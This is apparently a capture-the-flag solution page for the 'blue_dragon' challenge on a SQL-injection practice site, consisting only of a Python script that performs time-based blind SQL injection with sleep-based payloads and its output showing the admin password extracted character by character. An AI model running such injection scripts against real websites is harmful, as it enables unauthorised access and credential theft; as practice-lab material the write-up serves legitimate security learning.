---
custom_edit_url: null
pagination_next: null
pagination_prev: null
sidebar_position: 27
---

### Script

```python title="blue_dragon_script.py"
import requests
import urllib.parse
import string
import time

cookies = {'PHPSESSID': '4qt1p0e0vguiq8oousdc88vhv9'}
url = "https://los.rubiya.kr/chall/blue_dragon_23f2e3c81dca66e496c7de2d63b82984.php"
password_length = 0

for x in range(0, 100):
  pre = time.time()
  payload = f"' OR if(id='admin' AND length(pw)={x},sleep(3),1) -- -"
  encoded_payload = urllib.parse.quote_plus(payload)
  full_url = f"{url}?id={encoded_payload}"

  response = requests.get(full_url, cookies=cookies)
  post = time.time()

  if post-pre >= 3:
    password_length = x
    break

print()    
print(f"[!] Payload: ?pw={payload}")
print(f"[!] Payload (URL encoded): ?pw={encoded_payload}")
print(f"[!] password length: {password_length}")

password = ""
searchspace = string.digits + string.ascii_letters

for index in range(1, password_length + 1):
  for char in searchspace:
    payload = f"' OR if(id='admin' AND substr(pw,{index},1)='{char}',sleep(3),1) -- -"
    encoded_payload = urllib.parse.quote_plus(payload)
    full_url = f"{url}?id={encoded_payload}"

    pre = time.time()
    response = requests.get(full_url, cookies=cookies)
    post = time.time()

    if post-pre >= 3:
      password += char
      print()
      print(f"[+] Payload: ?pw={payload}")
      print(f"[+] Payload (URL encoded): ?pw={encoded_payload}")
      print(f"[+] Character at index {index}: {char}")
      break

print()
print(f"[!] Extracted password: {password}")
print(f"[!] Final payload: ?password={password}")
```

```
python .\blue_dragon_script.py

[!] Payload: ?pw=' OR if(id='admin' AND length(pw)=8,sleep(3),1) -- -
[!] Payload (URL encoded): ?pw=%27+OR+if%28id%3D%27admin%27+AND+length%28pw%29%3D8%2Csleep%283%29%2C1%29+--+-
[!] password length: 8

[+] Payload: ?pw=' OR if(id='admin' AND substr(pw,1,1)='d',sleep(3),1) -- -
[+] Payload (URL encoded): ?pw=%27+OR+if%28id%3D%27admin%27+AND+substr%28pw%2C1%2C1%29%3D%27d%27%2Csleep%283%29%2C1%29+--+-
[+] Character at index 1: d

[+] Payload: ?pw=' OR if(id='admin' AND substr(pw,2,1)='9',sleep(3),1) -- -
[+] Payload (URL encoded): ?pw=%27+OR+if%28id%3D%27admin%27+AND+substr%28pw%2C2%2C1%29%3D%279%27%2Csleep%283%29%2C1%29+--+-
[+] Character at index 2: 9

[+] Payload: ?pw=' OR if(id='admin' AND substr(pw,3,1)='4',sleep(3),1) -- -
[+] Payload (URL encoded): ?pw=%27+OR+if%28id%3D%27admin%27+AND+substr%28pw%2C3%2C1%29%3D%274%27%2Csleep%283%29%2C1%29+--+-
[+] Character at index 3: 4

[+] Payload: ?pw=' OR if(id='admin' AND substr(pw,4,1)='8',sleep(3),1) -- -
[+] Payload (URL encoded): ?pw=%27+OR+if%28id%3D%27admin%27+AND+substr%28pw%2C4%2C1%29%3D%278%27%2Csleep%283%29%2C1%29+--+-
[+] Character at index 4: 8

[+] Payload: ?pw=' OR if(id='admin' AND substr(pw,5,1)='b',sleep(3),1) -- -
[+] Payload (URL encoded): ?pw=%27+OR+if%28id%3D%27admin%27+AND+substr%28pw%2C5%2C1%29%3D%27b%27%2Csleep%283%29%2C1%29+--+-
[+] Character at index 5: b

[+] Payload: ?pw=' OR if(id='admin' AND substr(pw,6,1)='8',sleep(3),1) -- -
[+] Payload (URL encoded): ?pw=%27+OR+if%28id%3D%27admin%27+AND+substr%28pw%2C6%2C1%29%3D%278%27%2Csleep%283%29%2C1%29+--+-
[+] Character at index 6: 8

[+] Payload: ?pw=' OR if(id='admin' AND substr(pw,7,1)='a',sleep(3),1) -- -
[+] Payload (URL encoded): ?pw=%27+OR+if%28id%3D%27admin%27+AND+substr%28pw%2C7%2C1%29%3D%27a%27%2Csleep%283%29%2C1%29+--+-
[+] Character at index 7: a

[+] Payload: ?pw=' OR if(id='admin' AND substr(pw,8,1)='0',sleep(3),1) -- -
[+] Payload (URL encoded): ?pw=%27+OR+if%28id%3D%27admin%27+AND+substr%28pw%2C8%2C1%29%3D%270%27%2Csleep%283%29%2C1%29+--+-
[+] Character at index 8: 0

[!] Extracted password: d948b8a0
[!] Final payload: ?password=d948b8a0
```
